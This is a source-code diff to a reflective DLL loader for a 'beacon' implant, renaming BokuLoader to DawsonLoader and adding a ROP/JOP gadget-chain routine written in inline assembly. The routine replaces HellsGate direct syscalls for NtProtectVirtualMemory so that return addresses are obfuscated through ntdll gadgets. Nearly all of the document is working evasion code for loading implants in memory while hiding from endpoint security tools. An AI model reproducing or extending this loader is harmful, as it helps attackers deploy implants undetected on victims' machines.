@@ -1,13 +1,13 @@
-#include "BokuLoader.h"
+#include "DawsonLoader.h"
 
 // align stack so we don't end up crashing later with MMX registers
 __asm__(
-"Setup:\n"              
+"Setup:\n"
 "    push rsi\n"         // Save rsi to the stack
 "    mov  rsi, rsp\n"    // Set rsi to the current stack pointer
 "    and  rsp, 0x0FFFFFFFFFFFFFFF0\n"    // Align the stack to a 16-byte boundary
 "    sub  rsp, 0x20\n"   // Allocate 32 bytes of space on the stack
-"    call BokuLoader\n"
+"    call DawsonLoader\n"
 "    mov  rsp, rsi\n"    // Restore the stack pointer
 "    pop  rsi\n"         // Restore the original value of rsi
 "    pop  rcx \n"        // put ret address in rcx
@@ -16,7 +16,7 @@ __asm__(
 "    jmp  rcx \n"
 );
 
-void * BokuLoader()
+void * DawsonLoader()
 {
     SIZE_T size;
     void * base;
@@ -51,6 +51,14 @@ void * BokuLoader()
     BYTE syscall_gadget_bytes[] = {0x0F,0x05,0xC3};
     void * syscall_gadget = FindGadget((LPBYTE)ntdll->text_section, ntdll->text_section_size, syscall_gadget_bytes, sizeof(syscall_gadget_bytes));
 
+    // ========== JOPCALL INTEGRATION - Initialize ROP/JOP Gadget Chain ==========
+    // Discover gadgets in ntdll for return address obfuscation
+    // This only runs once and gadgets are reused for all syscalls
+    static GadgetChain rop_chain = {0};
+    if (rop_chain.count == 0) {
+        find_rop_gadgets(ntdll, &rop_chain);
+    }
+
     getApis(api);
 
     checkUseRWX(raw_beacon);
@@ -66,9 +74,11 @@ void * BokuLoader()
             // Add some extra size 
             size = raw_beacon->size + 0x2000;
             oldprotect = 0;
-            // NtProtectVirtualMemory syscall
-            HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
+            // NtProtectVirtualMemory syscall via ROP chain
+            WORD ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
+            jop_syscall(rop_chain.gadgets, rop_chain.count, ssn, syscall_gadget,
+                        NtCurrentProcess(), &base, &size,
+                        (PVOID)(ULONG_PTR)raw_beacon->BeaconMemoryProtection, &oldprotect);
             // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
             virtual_beacon->dllBase = base;
@@ -83,8 +93,11 @@ void * BokuLoader()
         if(base){
             oldprotect = 0;
             virtual_beacon->dllBase = base;
-            HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
+            // NtProtectVirtualMemory syscall via ROP chain
+            WORD ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
+            jop_syscall(rop_chain.gadgets, rop_chain.count, ssn, syscall_gadget,
+                        NtCurrentProcess(), &base, &size,
+                        (PVOID)(ULONG_PTR)raw_beacon->BeaconMemoryProtection, &oldprotect);
         }
     }
     else if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x2){
@@ -116,6 +129,9 @@ void * BokuLoader()
         // Allocate new memory to write our new RDLL too
         base = NULL;
         size = raw_beacon->size;
+        // NtAllocateVirtualMemory syscall via ROP chain
+        // Note: Using HellsGate/HellDescent for this complex syscall for now
+        // TODO: Extend jop_syscall to handle 6+ arguments
         HellsGate(getSyscallNumber(api->pNtAllocateVirtualMemory));
         ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon->BeaconMemoryProtection);
         RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
@@ -138,9 +154,11 @@ void * BokuLoader()
         base = virtual_beacon->text_section;
         size = virtual_beacon->text_section_size;
         newprotect = PAGE_EXECUTE_READ;
-        // NtProtectVirtualMemory syscall
-        HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
-        ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
+        // NtProtectVirtualMemory syscall via ROP chain
+        WORD ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
+        jop_syscall(rop_chain.gadgets, rop_chain.count, ssn, syscall_gadget,
+                    NtCurrentProcess(), &base, &size,
+                    (PVOID)(ULONG_PTR)newprotect, &oldprotect);
     }
 
     void * EntryPoint = virtual_beacon->EntryPoint;
@@ -1696,4 +1714,86 @@ __asm__(
     "syscall       \n"
     "ret           \n"
 
+);
+
+// ========== ROP/JOP-BASED SYSCALL EXECUTION ==========
+// Ported from jopcall/src/syscall.rs:181-260
+// This function executes syscalls through a ROP/JOP chain to obfuscate return addresses
+//
+// Arguments:
+//   rcx (arg1) = gadget_list pointer (array of gadget addresses)
+//   rdx (arg2) = gadget_count (number of gadgets in chain)
+//   r8  (arg3) = ssn (System Service Number)
+//   r9  (arg4) = syscall_addr (address of syscall instruction)
+//   Stack: arg5-arg9 = syscall arguments (arg1-arg5 for the actual NT syscall)
+//
+// How it works:
+//   1. Pushes all gadgets except the first onto the stack (LIFO order)
+//   2. Sets up syscall parameters in proper registers
+//   3. Jumps to first gadget (jmp rcx) with rcx pointing to syscall address
+//   4. Syscall executes and returns to the gadget chain on stack
+//   5. Gadgets execute in sequence, creating obfuscated return path
+__asm__(
+"jop_syscall:                       \n"
+    // Save callee-saved registers
+"    mov [rsp - 0x8], rsi            \n"
+"    mov [rsp - 0x10], rdi           \n"
+"    mov [rsp - 0x18], r12           \n"
+"    mov [rsp - 0x20], r14           \n"
+
+    // rcx = gadget_list pointer
+    // rdx = gadget_count
+    // r8 = ssn (System Service Number)
+    // r9 = syscall_addr
+
+    // Move gadget list pointer to r11
+"    mov r11, rcx                    \n"
+
+    // Calculate gadget count offset (gadget_count * 8 for 64-bit pointers)
+"    xor r14, r14                    \n"
+"    mov r14w, dx                    \n"
+"    shl r14, 3                      \n"  // r14 = gadget_count * 8
+
+    // Push all gadgets except first onto stack (LIFO order)
+    // The syscall will return to these gadgets, creating the ROP chain
+"    mov rax, r14                    \n"
+"    cmp rax, 0x08                   \n"
+"    je 2f                           \n"
+"    sub rax, 0x08                   \n"
+
+"3:                                 \n"
+"    push qword ptr [r11 + rax]      \n"  // Push gadget addresses
+"    sub rax, 0x08                   \n"
+"    cmp rax, 0                      \n"
+"    jne 3b                          \n"
+
+"2:                                 \n"
+    // Load first gadget (jmp rcx) into r11
+"    mov r11, [r11]                  \n"
+
+    // Setup syscall parameters
+"    mov eax, r8d                    \n"  // SSN into eax
+"    mov r12, r9                     \n"  // syscall address into r12
+
+    // Move function arguments from stack into registers
+    // Windows x64 calling convention: rcx, rdx, r8, r9, then stack
+"    mov r10, [rsp + 0x28]           \n"  // arg1 (becomes rcx for syscall via r10)
+"    mov rdx, [rsp + 0x30]           \n"  // arg2
+"    mov r8,  [rsp + 0x38]           \n"  // arg3
+"    mov r9,  [rsp + 0x40]           \n"  // arg4
+    // arg5 remains on stack at [rsp + 0x48]
+
+    // Place syscall address into rcx for jmp rcx gadget
+"    mov rcx, r12                    \n"
+
+    // Restore callee-saved registers
+"    mov rsi, [rsp - 0x8]            \n"
+"    mov rdi, [rsp - 0x10]           \n"
+"    mov r12, [rsp - 0x18]           \n"
+"    mov r14, [rsp - 0x20]           \n"
+
+    // Jump to first gadget (jmp rcx), which will jump to syscall
+    // The syscall will return to the gadgets we pushed on the stack
+    // This creates an obfuscated return path through legitimate ntdll code
+"    jmp r11                         \n"
 );   
